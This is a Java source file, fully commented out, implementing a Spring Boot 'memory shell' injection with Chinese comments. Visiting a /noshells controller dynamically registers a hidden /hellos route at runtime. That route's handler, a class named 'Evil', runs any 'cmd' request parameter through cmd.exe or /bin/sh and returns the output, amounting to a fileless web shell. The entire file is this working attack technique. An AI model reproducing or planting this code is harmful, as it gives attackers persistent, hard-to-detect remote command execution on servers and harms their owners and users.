//package priv.ga0weI.baseonframes.springboot;
//
//
//import org.springframework.stereotype.Controller;
//import org.springframework.web.bind.annotation.RequestMapping;
//import org.springframework.web.bind.annotation.ResponseBody;
//
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//
//import org.springframework.web.context.WebApplicationContext;
//import org.springframework.web.context.request.RequestContextHolder;
//import org.springframework.web.context.request.ServletRequestAttributes;
//import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
//import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
//import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
//import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
//import java.lang.reflect.Method;
//
//
//@Controller
//public class NoshellController {
//
//    @ResponseBody
//    @RequestMapping("/noshells")
//    public void noshell(HttpServletRequest request, HttpServletResponse response) throws Exception {
//
//        // 关于获取Context的方式有多种
//        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.
//                currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
//        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
//
//        // 通过反射获得恶意类的test方法
//        Method method = Evil.class.getMethod("test");
//        // 定义该controller的path
//        PatternsRequestCondition url = new PatternsRequestCondition("/hellos");
//        // 定义允许访问的HTTP方法
//        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
//        // 构造注册信息
//        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
////        RequestMappingInfo info = RequestMappingInfo.paths(String.valueOf(url))
////                .methods(ms)
////                .options(null)
////                .build();
//        // 创建用于处理请求的对象，避免无限循环使用一个构造方法
//        Evil injectToController = new Evil("xxx");
//        // 将该controller注册到Spring容器
//        mappingHandlerMapping.registerMapping(info, injectToController, method);
//        System.out.println("测试xxxxxx");
//        response.getWriter().println("inject success");
//    }
//
//    public class Evil {
//        public Evil(String xxx) {
//        }
//
//        public void test() throws Exception {
//
//            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
//            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
//// 获取cmd参数并执行命令
//            String command = request.getParameter("cmd");
//            if (command != null) {
//                try {
//                    java.io.PrintWriter printWriter = response.getWriter();
//                    String o = "";
//                    ProcessBuilder p;
//                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
//                        p = new ProcessBuilder(new String[]{"cmd.exe", "/c", command});
//                    } else {
//                        p = new ProcessBuilder(new String[]{"/bin/sh", "-c", command});
//                    }
//                    java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
//                    o = c.hasNext() ? c.next() : o;
//                    c.close();
//                    printWriter.write(o);
//                    printWriter.flush();
//                    printWriter.close();
//                } catch (Exception ignored) {
//
//                }
//            }
//        }
//    }
//
//}
//
//
//
//
